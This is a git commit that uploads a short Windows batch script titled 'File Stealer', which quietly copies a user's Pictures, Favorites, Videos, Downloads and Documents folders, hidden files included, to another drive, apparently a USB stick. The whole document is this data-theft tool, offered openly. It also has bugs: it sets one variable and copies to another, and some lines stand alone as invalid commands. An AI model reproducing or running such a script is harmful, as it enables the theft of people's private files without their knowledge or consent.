809ef6cb7d5a03d84cf750619d0ed655f372ce04
Gynoids <121044930+Gynoids@users.noreply.github.com>
2022-12-22 14:01:45 +0530

    Add files via upload

---
+++ File Stealer.bat
@@ -0,0 +1,15 @@
+@echo off
+color 9
+File Stealer By Gynoids
+:: variables
+/min
+SET odrive=%odrive:~0,2%
+set backupcmd=xcopy /s /c /d /e /h /i /r /y
+echo off
+%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
+%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
+%backupcmd% "%USERPROFILE%\videos" "%drive%\all\videos"
+%backupcmd% "%USERPROFILE%\Downloads" "%drive%\all\Downloads"
+%backupcmd% "%USERPROFILE%\Documents" "%drive%\all\Documents"
+@echo off 
+cls
